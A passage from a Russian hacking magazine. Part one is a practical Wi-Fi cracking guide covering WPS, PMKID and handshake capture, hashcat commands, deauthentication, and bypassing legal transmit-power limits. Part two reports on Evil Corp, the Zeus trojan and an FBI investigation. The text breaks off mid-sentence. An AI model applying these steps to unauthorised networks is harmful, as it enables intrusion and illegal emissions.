страничка о драйвере ath9k_htc. На ней при водится список чипсетов (с
USB — только AR9271) и выпускавшихся на нем девайсов. Его изу чение
показывает, что нам подойдет TL‐WN722N, пос коль ку он оснащен съемной
внешней антенной.
  По аналогии смотрим дру гие драй веры/чипы/девайсы и составляем
перечень моделей. Затем выбираем из них пос вежее и покупаем один (для
старта) или несколь ко донглов. Здесь нуж но быть внимательным с версией
устройства. Часто модели с одним номером, но раз ной ревизией — это прос‐
то два разных девайса в одинаковом корпусе.
  Списки драйверов обновляются волонтерами, то есть с непредсказуемы‐
ми задержками. В реаль ности перечень подходящих чипов больше. Раньше
он сводился в основном к моделям от Ralink и Atheros, а сейчас внезапно
пополнился Realtek RTL8812AU и RTL8814AU. Пос ледний работает с 802.11ac
и, помимо режима монито ринга, поддержи вает инжект пакетов. Правда, ему
нужен USB 3.0 (900 мА и 5 Гбит/с вмес то 500 мА и 0,48 Гбит/с у USB 2.0).


Зачем покупать несколько Wi-Fi-адаптеров?
Для выполнения продвинутых атак (например, «злой клон») и повышения
вероятности успеха любых дру гих. Просто потому, что нет универсального
адаптера. У каждого свои особен ности. Например, упомяну тые выше донглы
на базе AR9271 лучше справляются с атаками на WPS. Устройства с чипами
RT3572, RT5572 и RTL881xAU могут ата ковать цели в диапазоне 5 ГГц, а ста‐
рички с чипом RTL8187L  видят цель  за  сотни метров  из‐за поддер‐
жки 802.11g. Конечно, стандарт морально уста рел, однако его часто вклю‐
чают  в режиме  совместимости  даже  на  новых  роуте рах  с  поддер‐
жкой 802.11ac/ax.


По чему для вардрайвин га совету ют дон глы от Alfa Networks?
Этот тайваньский производитель специализируется на беспроводном обо‐
рудовании, причем делает его чуть лучше (и гораздо дороже) других. Нап‐
ример, во многих его адаптерах встречается экра нирование (повышает чувс‐
твительность приемника) или встро енный усилитель (увеличивает пиковую
мощность передатчика). Почти все модели оснащены съемными антеннами
(ты можешь прикрутить свою, более подходящую). Для удобства выбора есть
даже специальный раздел  Kali WiFi USB, где ука заны адаптеры, гаран‐
тированно работающие в Kali Linux в режиме мониторинга. Если есть деньги,
но нет времени — бери «Альфу», не ошибешься. Это как Cisco для админов.


КАКИЕ НАСТРОЙКИ СДЕЛАТЬ ПЕРЕД АУДИТОМ?
Запустив Kali в дефол тных конфигах и вот кнув свежераспакованный Wi‐Fi‐
адаптер, ты сможешь взло мать раз ве что свой роутер, стоящий в той же ком‐
нате. Чтобы выяснить возможность удален ной атаки с улицы (или хотя бы
из соседнего помеще ния), требует ся сделать следующее:
 • отключить энергосбережение для Wi‐Fi‐адап тера;
 • повысить мощность донгла;
 • подготовить словари для перебо ра паролей;
 • обновить весь интегрированный софт и уста новить допол нительный;
 • проверить и сох ранить изменения.


Как отключить энергосбе реже ние для Wi-Fi-адаптера в Kali?
В терминале пишем:


iw dev # Выводим список Wi‐Fi‐адаптеров и отыскиваем внешний донгл
по его MAC‐адресу
iw dev wlan1 set power_save off # Здесь внешнему донглу присвоено
имя wlan1

Если  отклю чишь  энергосбережение  и  повысишь мощ ность  адаптера,
не забудь организовать ему охлаждение. Также лучше использовать порты
USB 3.0 или усилен ные по питанию USB 2.0. Обычно их выделя ют цве том.


Как повысить мощность Wi-Fi-адаптера?
Есть два способа раскочега рить их. Первый — через глобальные нас тройки
в Kali. Он подходит для тех адаптеров, которые считывают код региона из ОС.


Спо соб 1
Сначала смотрим текущие парамет ры:
 • iw dev показывает список беспро водных адап теров и их максимально
   разрешенную настрой ками мощность. Обычно мы видим txpower 20.00
  dBm (+20 децибел по отно шению к милливатту), что в теории означает
  мощность передатчика 100 мВт, а на практике — что твой «свисток» ата‐
   куемые роутеры, скорее всего, не услышат;
 • iw reg get отображает глобальные нас тройки ограничений по исполь‐
   зованию Wi‐Fi. В частнос ти, код страны по стандарту ISO 3166‐1, дос‐
   тупные частотные диапазоны и ширину каналов. Если указано country
  00 , то страна не задана и действу ют жес ткие огра ничения.

Наиболее либеральные нормативы для Wi‐Fi у Гай аны (GY) и Белиза (BZ), где
разрешается в десять раз большая мощность Wi‐Fi‐адаптеров. Соответству‐
ющая запись в базе выглядит так: country BZ: DFS‐JP. (2402 ‐ 2482 @ 40), (30).
(5735 ‐ 5835 @ 80), (30). Аббревиатура DFS пос ле кода страны означает Dy‐
namic Frequency Selection — динамичес кий выбор частоты. Он может выпол‐
няться по американской (FCC), европейской (ETSI) или японской (JP) схе ме.
Изменять ее не надо.
   Дальше указывается частотное окно в диапазонах 2,4 и 5 ГГц и ширина
канала в мегагерцах. От этих парамет ров зависит, сколько каналов ты уви‐
дишь.
   Чтобы сменить регион, прос то пишем в терминале:


iw reg set BZ # Мысленно переносимся в Белиз вместе с ноутбуком
ip link set wlan1 down # Отключаем внешний донгл, обозначенный как
wlan1
iw dev wlan1 set txpower fixed 23 mBm # Увеличиваем вдвое мощность
передатчика

Шкала здесь логарифмическая, поэто му повышение мощности в два раза
(до 200 мВт) соответству ет усилению на 3 dBm (до 23 дБм). Проще говоря,
TxPower(dBm) = 10 * LOG(P/1), где P — мощность в милливаттах.





             Меняем регион и получаем 1000 мВт

Не спеши сразу врубать донгл на полную. Для каждого девайса есть разум‐
ный предел, который подбира ется эксперименталь но. У меня один из адап‐
теров стабильнее работает на 27 дБм (500 мВт), чем на 30 дБм (1000 мВт),
а другой вообще бесполезно гнать выше 23 дБм.
   Если же тебе посчас тливилось купить качественный донгл с большим
запасом по мощности (например, уличного исполнения), то попробуй указать
регион PA. Это Панама, где разрешены передатчики до 4 Вт (36 дБм). Прав‐
да, от порта USB 2.0 ты столько не получишь — нужен USB 3.0 или допол‐
нительное питание.


Спо соб 2
Используется для тех Wi‐Fi‐адаптеров, у которых региональный код прошит
в собственной памяти. Например, это все встречавшиеся мне адаптеры Alfa
Networks. Они игнорируют глобальные нас трой ки (включая iw reg set BZ),
поэтому придет ся менять сами ограничения для той страны, которая уже
записана в памяти донгла.


iw reg get # Узнаем, для какой страны выпущен адаптер
git clone https://kernel.googlesource.com/pub/scm/linux/kernel/git/
sforshee/wireless‐regdb # Клонируем себе базу региональных
ограничений Wi‐Fi
cd wireless‐regdb/ # Переходим в этот каталог
gedit db.txt # Правим исходник базы





  Меняем ограничения мощ ности передатчиков Wi‐Fi в региональных нас ‐
  тройках

Находим нужную страну по коду и вместо 20 (дБм) в скобках везде пишем 30
(или вообще 33, то есть 2000 мВт). Ана логичные изменения делаем для coun‐
try 00 (да хоть для всех стран) и сохраняем db.txt.
   Раньше, чтобы скомпилировать базу из текстового файла и подписать ее,
требовалось установить обо лочку Python для биб лиотеки OpenSSL, но в
новой версии Kali она уже есть (python3‐m2crypto). Поэтому просто пишем
команду make и получаем новый regulatory.bin, где все ограничения сняты
(точнее, заданы заведомо большими).





       Делаем свою базу с разрешени ями на более мощный Wi‐Fi

Далее удаляем старую (оригинальную) базу, копируем вмес то нее нашу
(модифицированную), копируем наш открытый ключ (поскольку база име ет
цифровую подпись) и ребутимся.


rm /lib/crda/regulatory.bin
cp regulatory.bin /lib/crda/regulatory.bin
cp $USER.key.pub.pem /lib/crda/pubkeys/
reboot





      Меняем ограничения мощ ности в региональных настройках

Все! Теперь после перезагрузки в Live USB Persistence выставляем адап‐
терам повышенную мощность стандартным спо собом.


ip link set wlan1 down # Выключили донгл
iw dev wlan1 set txpower fixed 23 mBm # Повысили мощность вдвое
ip link set wlan1 up # Включили донгл

Проверяем результат:


iw reg get

Должно быть примерно так (здесь увеличение мощ ности на 10 дБм).





           Повысили мощ ность Wi‐Fi‐адаптера в десять раз


КАКУЮ АНТЕННУ ИСПОЛЬЗОВАТЬ ДЛЯ ВАРДРАЙВИНГА?
Зависит от конкретных задач. Одни обеспечива ют широту охвата, другие поз‐
воляют дотянуться до далекой точки дос тупа, фокусируя ЭМИ узким лучом.
   Разведку в эфире удоб нее выполнять с дипольными антеннами, у которых
широкий угол излучения, но низкий коэффициент усиления (КУ). Эти величи‐
ны всегда взаимосвязаны, пос кольку антенна не добавляет мощности,
а просто фокусирует электро магнитные волны. Поэтому при вертикальной
ориентации в горизонтальном направлении связь улучшается, а в другом (в
сторону верхних и нижних этажей) — ухудшается.
  Самая широкая диаграмма направлен ности у крошечных антенн с КУ
до 5 дБи. Здесь ради маркетин гового эффекта используется децибел
по отношению не к милливатту, а к изот ропному излу чателю — математичес‐
кой модели антенны с диаграммой в виде сферы. Если покупатель видит две
антенны, у которых написано «5 дБи» и «3 дБм», то считает первую «более
мощной», хотя они практически идентичны.
  Простые диполь ные антенны часто предлага ются в комплекте, и для
начала их вполне достаточно. Затем рекомендую попробовать антенну Alfa
ARS‐N19 с КУ 9 дБи — максимально разумным для всенаправленных антенн.
Это длинная удочка с более узким углом излучения, зато и дальность уверен‐
ного приема больше.
   Главные недостатки таких антенн — габари ты (у ARS‐N19 — 39 см, в кар‐
ман не положишь) и небольшой  час тотный диапазон  (либо  2,4  ГГц,
либо 5 ГГц). Поэто му одной не обойтись.
  Более компактная и универсальная антенна — Alfa APA‐M25. Она панель‐
ная (частично направленная) и двухдиапа зонная. На частоте 2,4 ГГц обес‐
печивает КУ 8 дБи, а на 5 ГГц — 10 дБи. С ней удобно атаковать пред‐
варительно выбранные точки доступа, расположение которых ты хотя бы при‐
мерно представ ляешь. Антенну придется как отклонять по вертикали, так
и крутить по горизонтали, чтобы нацелить ся на выб ранный роутер.
  Совсем хардкорные варианты — направлен ные антенны с большим КУ
и очень узким лучом (секторной диаграммой направленности). Такими можно
достать цель хоть за километр, но выполнить и зафиксировать их точное
наведение крайне сложно. Разрабатывались они преимущественно для стан‐
дартов 802.11b/g — дальнобойных, но медленных. Попытка применять их
для связи по стандарту 802.11n и тем более 802.11ac оправданна только
в исключительных случаях.


Как подоб рать положе ние антенны?
Самый простой способ — запустить скрипт Wiﬁte2 (о нем ниже). В новой вер‐
сии уровень сигнала всех найденных точек доступа обновляется каждую
секунду — как при сканировании, так и во время атаки. Прос то медленно
поворачивай антенну сперва в вертикальной плоскости, а затем в горизон‐
тальной. Зафиксируй положение, в котором цифры будут максимальные.
  Еще одно важное примеча ние: соотношение сигнал/шум также меняется
в зависимости от расположения самого адаптера, особенно если его плата
не экранирована. В моем эксперименте откло нение Wi‐Fi‐адаптера Alfa Tube‐
UNA из вертикального положения в горизонталь ное прибавило 7 дБм при той
же ориентации антенны. Выб ранная точка дос тупа вышла из зоны неуверен‐
ного приема и была успешно… проинспектирована. :‐)


Как под ключить нестандартную антенну?
На практике антенны приходится менять, поэто му выбирать стоит адаптер
с разъемом для подключения внешней антенны. Проблема в том, что они
бывают разные и не подходят друг к другу. Обычно для оборудования внутри
помещений применяется миниатюрный разъем RP‐SMA, а у более мощных
«уличных» адаптеров типа Alfa Tube‐UNA — большое гнез до N‐Type. Под‐
ружить их помогают коаксиальные переходники. Выбирай максимально
качественные, иначе сильно ухудшится соотношение сигнал/шум (SNR).
На фото показан переходник N‐Type — RP‐SMA. Я использовал его для под‐
клю чения антенн ARS‐N19 и APA‐M25 к Alfa Tube‐UNA со встроенным усилите‐
лем сигнала.





   Подклю чаем антенну с разъ емом RP‐SMA к адап теру с гнездом N‐Type




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      WI-FI TOTAL PWN
          ОСВАИВАЕМ С НУЛЯ АКТУАЛЬНЫЕ ТЕХНИКИ
                                 ПЕНТЕСТА WI‐FI





Как авто матизиро вать аудит точек доступа Wi-Fi?
Порог вхождения для обучения взлому Wi‐Fi постоянно снижается. За пос‐
ледние пару лет снова выросла подборка простых и эффективных утилит,
автоматизирующих выполнение большинс тва типов атак по каналам беспро‐
водной связи. Когда‐то в Kali (тогда еще BackTrack) были только сырые скрип‐
ты, а сейчас глаза разбега ются от обилия готовых инстру ментов.
  Сегодня даже не обя зательно начинать с изу чения Aircrack‐ng — пакета,
на котором основаны практически все инстру менты взлома Wi‐Fi. Быстро
получить практический результат помогут скрипты WiFi‐autopwner от Алексея
Милосердова и Wiﬁte2 от Derv Merkler (псевдоним программиста из Сиэтла).
  Мне нравятся оба скрипта, но привычнее Wiﬁte2 и его народный форк. Он
грамотно использует дополнитель ные ути литы для повышения эффектив‐
ности аудита и позволяет автоматически выпол нять пять самых рас-
пространен ных типов атак на все сра зу или только на указанные точки
доступа.
   Wiﬁte2 применяет bully, tshark и reaver для выполнения атак на WPS
методом PixieDust или перебо ром пинов. Он использует coWPAtty и pyrit
для проверки хендшейков, захваченных во время ата ки на WPA(2), и ре али-
зует новую атаку на PMKID с использованием hashcat.





                  Успешный захват хендшейка PMKID

Все типы атак уже отсортирова ны по скорости выполнения. Сначала для выб‐
ранной точки доступа используются самые быс трые (WPS, WEP, PMKID), а в
случае неудачи скрипт переходит к следующим вариантам. Более того,
при включении режима verbose ‐vv в терминале выводятся все использован‐
ные команды и их резуль тат. По сути, это режим обу чения и отладки.


КАКАЯ АТАКА НА WI-FI САМАЯ БЫСТРАЯ?
Раньше я бы ответил: WPS. Если на точке дос тупа включен Wi‐Fi Protected Set‐
up, то с большой вероятностью она вскрывает ся перебором извес тных пинов
или более изящной атакой PixieDust. Список пинов для перебора берется
из дефолтных конфигов производителя, который определяется по MAC‐адре‐
су. Делать исчерпывающий перебор всех вариантов (брутфорс) чаще всего
бессмысленно, так как пос ле N неудачных попыток авторизации по WPS
роутер надолго блокиру ет дальнейшие.





          Успешный подбор WPS PIN с помощью WiFi‐Autopwner

В любом случае атака на WPS занимала до пяти минут и казалась скорос тной
по сравнению с ожиданием захвата хендшейка WPA, который потом еще надо
мучительно долго брутить. Однако сейчас появился новый тип атаки — PMKID
(Pairwise Master Key Identiﬁer). На уяз вимых роутерах она позволяет захватить
хендшейк за считаные секунды, и даже при отсутствии подключенных к нему
клиентов! С ней не надо никого ждать и деаутентифицировать, дос таточно
одной (даже безуспешной) попытки авторизации с твоей стороны.
  Поэтому оптимальный алго ритм взло… аудита следующий: опре деля ем,
вклю чен ли на целевой точке доступа режим WPS. Если да, запускаем Pix‐
ieDust. Безуспешно? Тогда перебор известных пинов. Не получи лось? Про‐
веряем, не вклю чено ли шифрование WEP, которое тоже обходится влет. Если
нет, то выполняем атаку PMKID на WPA(2). Если уж и так не получи лось, тогда
вспоминаем классику и ждем хендшейка (что бы не палиться) или активно
кикаем клиентов, чтобы наловить их сессии авторизации.


Я узнал WPS PIN, что дальше?
Дальше с его помощью можно подключиться к роутеру и узнать пароль,
каким бы длинным и сложным он ни был. Вооб ще WPS — это огромная дыра
в безопасности. На сво ем обо рудовании я всегда его отключаю, а потом
еще проверяю Wi‐Fi‐сканером, действительно ли WPS выключен.


Я перехватил хен дшейк. Что с ним делать?
Четырехстороннее рукопожатие записывается скриптом Wiﬁte2 в файл с рас‐
ширением .cap.





                 Захват клас сического хендшей ка WPA

TCPdump, Wireshark, Nmap и другие программы используют формат .pcap.
Хендшейк PMKID будет иметь формат .16800.
  По умолчанию Wiﬁte использует для подбора паролей Aircrack‐ng. Он
отправляет команду вида


aircrack‐ng yourhandshake.cap ‐w /yourwordlist.txt

В простейших вариантах это го достаточно, одна ко чаще приходится кон‐
вертировать хендшейки с помощью hcxtools, что бы скормить одной из прод‐
винутых утилит для перебора паролей. Например, John the Ripper или hashcat.
  Мне больше нравится hashcat. Для работы с ней нужно конверти ровать
.cap в формат .hccapx. Сделать это можно также он лайн или локально ути‐
литой cap2hccapx. В пос леднем случае придет ся скачать исходник и ском‐
пилировать его.


wget https://raw.githubusercontent.com/hashcat/hashcat‐utils/master/
src/cap2hccapx.c
gcc ‐o cap2hccapx‐converter cap2hccapx.c

Полученный исполняемый файл cap2hccapx‐converter удобнее закинуть
в /bin, чтобы затем обращать ся к нему откуда угодно.


mv cap2hccapx‐converter /bin





       Успешный подбор пароля Wi‐Fi в hashcat по хендшейку WPA2

Точно так же брутятся хеши PMKID. Прос то нуж но явно указать hashcat тип
хендшейка и словарь.


hashcat64 ‐m 2500 ‐w3 Beeline.hccapx "wordlist\wpadict.txt" #
Перебираем пароли по своему словарю wpadict.txt к хешу из
рукопожатия WPA(2) в файле Beeline.hccapx
hashcat64 ‐m 16800 ‐w 3 RT‐WiFi.16800 "wordlist\rockyou.txt" #
Используем хендшейк PMKID из файла RT‐WiFi.16800 и готовый словарь
rockyou.txt





                         Брут PMKID в hashcat


НА ЧЕМ БРУТИТЬ ПАРОЛИ WI-FI?
Локально перебирать пароли лучше на дес ктопном компе с мощ ной видюхой,
а если его нет, воспользуйся онлайновыми сервисами. Бесплатно в них пред‐
лагаются ограниченные наборы, но даже их порой достаточно.





                    Взлом двух паролей онлайн

Еще один интересный вариант — использовать сеть распре деленных вычис‐
лений. Сделать это позволяет, нап ример, Elcomsoft Distributed Password Re‐
covery. Эта универсаль ная программа понимает десятки форматов паролей
и хешей, включая .cap, .pcap и .hccapx. Над одной задачей в ней одновремен‐
но могут работать до десяти тысяч компьютеров, объ единяя ресурсы своих
процессоров и видеокарт.





                  Рас пределенный брут хешей WPA

Плюс у нее очень продвинутый подход к словарной атаке. Можно исполь‐
зовать маски, приставки и мутации, фактически расширяя объем словаря
в несколько раз.


По чему выпол няют атаку по сло варю вместо бру та?
Ключ WPA(2)‐PSK генерируется длиной 256 бит. Число возможных ком‐
            256)бинаций (2    таково, что даже на мощ ном сервере с графическими уско‐
рителями потребуются годы для их перебора. Поэтому реалистичнее выпол‐
нить словарную атаку.
  Обычно Wiﬁte2 делает это сам. После захвата хендшейка он проверяет его
качество. Если все нужные данные в нем сохранились, то автоматически
запускается атака по сло варю wordlist‐top4800‐probable.txt. Как нет‐
рудно догадаться, в нем всего 4800 самых распространенных паролей.
  Он удобен тем, что быстро срабатывает даже на стареньком ноутбуке,
однако с большой веро ятностью искомой комбинации в этом словаре
не будет. Поэтому стоит сделать свой.


Как составить свой сло варь?
Сначала я собрал кол лекцию сло варей из раз ных источников. Это были пре‐
дустановленные сло вари в программах для перебора паролей, каталог
/usr/share/worldlists/ в самой Kali Linux, базы утекших в Сеть реальных
паролей от разных аккаунтов и подборки на профильных форумах. Я привел
их к единому формату (кодировке), используя ути литу recode. Дальше пере‐
именовал словари по шаблону dict##, где ## — счетчик из двух цифр.
Получилось 80 словарей.





       Объединяем 80 сло варей, пропуская одинаковые записи

На следующем этапе я объединил их в один, уда лив явные повторы, после
чего запустил утилиту PW‐Inspector для очис тки объ единенного словаря
от мусора. Поскольку пароль для Wi‐Fi может быть от 8 до 63 символов, я уда‐
лил все записи короче 8 и длиннее 63 знаков.


cat * > alldicts | sort | uniq
pw‐inspector ‐i alldicts ‐m 8 ‐M 63 > WPAMegaDict

Затем я подумал, что получился слиш ком здоровый файл, который можно
сократить сильнее без явно го ущерба для эффективности перебора. Ты
видел в реальной жизни пароли Wi‐Fi длиннее 16 символов? Вот и я не видел.


pw‐inspector ‐i WPAMegaDict ‐m 8 ‐M 16 > WPADict_8‐16

На файлообменнике Кима Доткома можно ска чать получившийся словарь
(647 Мб в ZIP‐архиве, 2,8 Гб в распакованном виде).


КАК ПЕРЕКЛЮЧИТЬСЯ В ДИАПАЗОН 5 ГГЦ?
Сначала нужно подклю чить Wi‐Fi‐адап тер с поддержкой 5 ГГц и оснастить его
подходящей антенной (они тоже дела ются для разных диапазонов). Затем
просто запусти Wiﬁte с ключом ‐5, и увидишь пятигигагерцевые точки дос‐
тупа. Обычно их гораздо меньше, чем 2,4 ГГц. Связано это как с их отно‐
сительно малым распростра нением, так и с меньшим радиусом дей ствия.
Чем выше частота, тем (при прочих равных) быстрее затухает сигнал.





                   Включаем режим 5 ГГц в Wiﬁte


МОЖНО ЛИ АТАКОВАТЬ СКРЫТУЮ СЕТЬ?
Да. Если имя сети (ESSID) скрыто, ты точно так же видишь MAC‐адрес точки
доступа во время сканиро вания эфира. Первый же подключившийся клиент
раскроет ее имя. Поэтому просто подожди коннекта или ускорь процесс,
разослав пакеты деаутентифика ции.





             Выясня ем имя скрытой сети мимоходом


ЗАКЛЮЧЕНИЕ
Когда я писал эту статью, то ставил перед собой цель помочь читателям
как можно быстрее получить практичес кий результат с нуля и почти без ущер‐
ба для понимания сути процес са. Мне хотелось уместить в одну публикацию
все для мощного старта и зажечь искру интереса, которая подвигнет
на самостоятельное продолжение.
  На курсах по пен тестам я не раз обращал внимание, что за свои кровные
ты получаешь инфу не первой свежес ти. В ответ преподаватели обычно
говорили, что рассказыва ют основы, суть не меня ется годами, поэтому вы уж
сами погуглите и дорабо тайте наши матери алы напильником. На мой взгляд,
суть как раз в деталях, а они меня ются очень быстро. Надеюсь, мой вымучен‐
ный конспект поможет набрать кру тизны тво ей кри вой обучения.


        WWW

                   •Он лайн‐перебор хешей, в том числе из хен‐
                      дшейков WPA2
                            •Pyrit — еще одна ути лита для быстрого перебо‐
                        ра паролей на ЦП и ГП
                    •Некоторые трюки при взломе Wi‐Fi
ВЗЛОМ

ОДИНОЧКА
 ПРОТИВ КОРПОРАЦИИ ЗЛА





             КАК БРАЙАН КРЕБС БОРОЛСЯ
           С РУССКИМИ ХАКЕРАМИ
           ИЗ EVIL CORP
          atreau




Хакерскую группировку Evil Corp называют самой вредонос‐
ной и самой наглой среди киберпреступников. За сведения
о ее членах американ ское правительство назначило наг раду
в 5 миллионов долларов, а СМИ обсуждают слухи об их рос‐
кошном образе жизни и возможных связях с российскими
спецслужбами. Мы постарались поподробнее разобраться
в истории этой хакерской груп пы, образе действий и инстру‐
ментах, с помощью которых она достигла своих сомнитель‐
ных успехов и признания.


Главой  Evil Corp называют Максима Якубца. Правоохранительные органы
разных стран разыскивают его вот уже более десяти лет — еще в 2009 году
он привлек к себе внимание, учас твуя под ником aqua в краже денег из казны
округа Буллитт, штат Кентукки. Об этом прес туплении писали в газете Wash‐
ington Post, с которой тогда сот рудничал в качес тве эксперта по кибер‐
безопасности Брайан Кребс.





  Скриншот из архива Брайана Кребса с форума DirectConnections,
  на котором aqua в 2011 году делился опы том


КРИМИНАЛЬНЫЙ ЗООПАРК: ДЕНЕЖНЫЕ МУЛЫ И КОЗЛЫ
ОТПУЩЕНИЯ
Уже тогда у хакеров была отра ботанная схема действий, в которой Максим
Якубец отвечал за работу с «денежными мулами». Так называют людей,
которые выводят деньги из банковской системы (где все переводы отсле‐
живаются и могут быть отоз ваны), совершая необ ратимые транзакции. Тра‐
диционно для мошенничес ких схем использовалась сис тема Western Union,
но в последнее время набирает популярность криптовалюта Bitcoin.


Любопыт ный факт
Western Union фигурирует в качестве пос редника в огромном числе историй
с отмыванием денег, мошенничес твом и даже финансированием террориз‐
ма. Иногда они платят штрафы — американско му правительству полмилли‐
арда долларов, ирландскому — полтора миллиона евро. Платят и продол‐
жают работать, не обра щая внимания на обвинения в «недостаточно тща‐
тельном отслеживании подозрительных транзакций». Почему им это сходит
с рук? Никто не знает наверняка, но, возможно, это как‐то свя зано с их чрез‐
вычайно длительным и пло дот ворным сот рудничес твом с американским пра‐
вительством. Western Union работала над обо ронными заказами, которые
имеют отношение к созданию систем свя зи и управлению ими. Такие дела.


Многие люди становятся «мулами», совершенно не представляя, чем они
занимаются на самом деле и каковы могут быть пос ледс твия их действий.
В «схеме Якубца» в «мулы» вербовали на абсолютно легальных сайтах
с вакансиями, обещая работу из дома от имени небольших, но солидно выг‐
лядящих компаний. Более того, для проверки работоспособности и надеж‐
ности кандидатов им давали предварительные задания — например, испра‐
вить опечат ки и грамматику в текстах, обещая заплатить по 8 долларов
за килобайт. Текстами же были деловые пись ма — от лица подставной ком‐
пании хакеров в адрес ее подрядчиков. Так что, когда людям приходило пись‐
мо с заданием совершить денежный перевод, оставив себе 5% от суммы
в качестве оплаты, они не удивлялись и выполняли такое задание.
   Удивляться им, разумеется, приходилось потом, когда оказывалось, что
теперь они должны всю сумму перевода какому‐нибудь банку. Ведь банк
всегда может отследить и отоз вать ошибочные транзакции — и всегда най‐
дет, с кого взыскать недос тающее. Таким образом, финансовую ответствен‐
ность за деятельность рус ских и укра инских хакеров в итоге приходилось нес‐
ти американским и европейским домохозяйкам и пенсионерам.


НОВИЧКИ И ВЕТЕРАНЫ: СЛЕД ЗЕВСА С ОЛИМПА
КИБЕРПРЕСТУПНОСТИ
В истории с казной округа Буллитт двадцатидвухлетний Максим Яку бец был
тесно связан с Евгением Богачевым — уже тогда чрезвычайно известным
хакером, автором трояна Zeus. За поимку этого персонажа ФБР назначило
почти столь же впечатляющую наг раду, как и за Якубца.





  Ни одна статья с упоминанием Евгения Богачева не может обойтись
  без этого фото с бен гальской кош кой и другими атрибутами рос кошной
  жизни

Именно в связи с этим инцидентом о них и узнал Брайан Кребс. К тому
моменту он уже давно был завсегдатаем открытых, полузакрытых и совсем
закрытых хакерских форумов. Были у него и какие‐то прямые источники,
которые предоставляли ему информа цию из перепис ки хакеров.

Отку да дро виш ки?
Разумеется, как Кребс, так и ФБР не раскрывают под робностей своих рас‐
следований и источники информации. Но на сай те Кребса при водятся мно‐
жественные куски из логов Jabber‐переписки хакеров, и эта же перепис ка
цитируется в документах ФБР как важное сви детель ство. Переписка, разуме‐
ется, велась на русском (который Кребс, кста ти, изучает уже больше пят‐
надцати лет) — но что на сайте Креб са, что в официальных документах ФБР
она дана в переводе на английский. И судя по всему, у Кребса и ФБР этот
перевод одинаковый  (максимально  связ ные предложения и тщательно
переведенные русские ругательства).


Что в переписке, что на форумах хакеры исполь зовали одни и те же привыч‐
ные никнеймы. Кребс утвержда ет, что такая неб режность в этих кру гах встре‐
чается очень часто (что изрядно облегчает ему отслеживание «карьерного
роста» интересующих его игроков на арене киберпреступности). Богачев был
lucky12345 или slavik, а Яку бец — aqua.


Zeus
Zeus — многокомпонентный банковский трой, нас читывающий множество
модификаций. Основная функция заключа ется в краже паролей от банковских
приложений, FTP‐клиентов, других программ. Тро ян может выполнять пос‐
тупающие с управляющего сервера команды, перехватывать вводимые поль‐
зователем в браузерах данные (кейлоггинг и формграббинг), красть файлы
cookies, устанавливать в системе цифровые сертификаты и удалять их, бло‐
кировать доступ к заданным киберпрес тупни ками интернет‐ресурсам, под‐
менять стартовую страницу в бра узерах, загружать и запускать программы,
а также удалять файлы на жестком диске.


Хакеры не просто обсужда ли покупку у Богачева «базовой версии» его трояна
Zeus — они заказали ему модифицированную версию, Jabber Zeus, которая
пересылала похищенную банковскую информацию по протоколу Jabber.
Это позволяло злоумышленникам крайне оперативно планировать свои дей‐
ствия и управлять своей широко рас кинутой сетью троянов — например, они
могли получать Jabber‐сообщения о том, что какая‐то из их потенциальных
жертв пополнила свой банковский счет.





  На форуме Mazafaka обсужда ют применение стандартной версии Zeus,
  которой Богачев широко торговал

Якубец очень гор дился сотрудничес твом с Богачевым и их ори гинальной иде‐
ей, в сравнении с которой все остальные поль зовате ли Zeus выглядели
новичками. Но пресс‐релиз ФБР сообщает край не интерес ные под робности
расследования, из которых следует, что именно использование Jabber‐про‐
токола и подвело хакерскую группу, а для Максима Якубца, возможно, имен‐
но это событие сыграло важ ную роль в его судьбе.


JABBER-БОЛТУН — НАХОДКА ДЛЯ ШПИОНА
Следи за руками: сейчас мы расска жем, как расследуют киберпрес тупления!
А также ты узнаешь, как множество мелких недочетов складываются в боль‐
шие проблемы.
   Итак, новая версия тро яна пересылает раз личную банковскую информа‐
цию (логины, одноразовые пароли, PIN‐коды, журналы кей логгеров) по про‐
токолу Jabber. Этот протокол — децентра лизованный, любой человек может
поднять свой собственный сервер. Анализ зараженных компьютеров показал,
что все они отправляют сообщения на один сервер на домене incomeet.com.
   Дальше ФБР выяснило, что этот домен хос тится на сервере, принад‐
лежащем обычной компании‐хостеру. И что офис этой компании располага‐
ется в Нью‐Йор ке. После чего, разумеется, им не составило труда изъ ять
сервер и хорошенько изу чить его. На сервере осталось огромное число
логов — и не только технических сооб щений трояна, но и обычной переписки!
Оказалось, что хакеры использовали свой Jabber‐сервер в том числе и для
координации действий, и для простой болтовни.
  Конец немного пред ска зуем. В логах перепис ки нашлось и обсуждение
той самой статьи Брайана Кребса в Washington Post (то есть пря мое приз‐
нание в совершенных преступлениях), и никнеймы, которые хакеры исполь‐
зовали как в чате, так и на форумах.
  Справедливости ради надо  ска зать,  что хакеры стремились свести
к минимуму обсуждение личной информа ции. Но следователи постарались
и смогли найти зацепки. Лучшей их зацепкой стал эпизод, когда хакеры
обсуждали альтернативные способы свя зи — и aqua (то есть Якубец) поп‐
росил скинуть ему номер телефо на сво его сообщника письмом на электрон‐
ную почту. После чего сообщил адрес почты на mail.ru.
  На дворе стоял июль 2009 года. Отношения между США и Рос сийской
Федерацией были сравнительно теплыми, практиковалось в том числе и сот‐
рудничество правоох ранительных орга нов. ФБР обратилось за помощью
к российским коллегам — и получило ее.
   Российские правоох ранительные орга ны переда ли ФБР краткие, но весь‐
ма информативные сводки, из которых следует, что в компании  Mail.ru
активно с ними сотрудничали. Выяснилось, что на ука занный адрес приходи‐
ли письма как для хакера aqua (с предложени ем написать вирус), так и для
человека по име ни Максим Якубец — который покупал билеты в турагентстве
и заказывал доставку детской коляски на определенный адрес в Москве.
  После этого, разумеется, по установленно му адре су последовал визит
силовиков и обыск. Американским коллегам вежливо сообщили, что в данной
квартире действительно был обнаружен некий Максим Якубец, а также жен‐
щина, личные дан ные которой тоже любез но переда ли в ФБР.
  На этом список любезностей закончился. С американской стороны, впро‐
чем, на этом работа не завершилась — они про дол жили копать, чтобы соб‐
рать побольше убедительных доказательств. Потребовав сотрудничества
от Microsoft, ФБР отыскало Skype‐аккаунт, зарегистрированный на тот же
email с Mail.ru и на имя Максим Я. В списке контактов этого аккаунта обна‐
ружилась женщина, в которой смогли уста новить ту самую особу, присутс тво‐
вавшую в квартире во время обыска.
   Эта же самая женщина нес колько раз подава ла заявление на получение
американской визы. Судя по всему, ее въезду в страну не препятствовали,
но скрупулезно вели досье, обращая внимание на изменение брачного ста‐
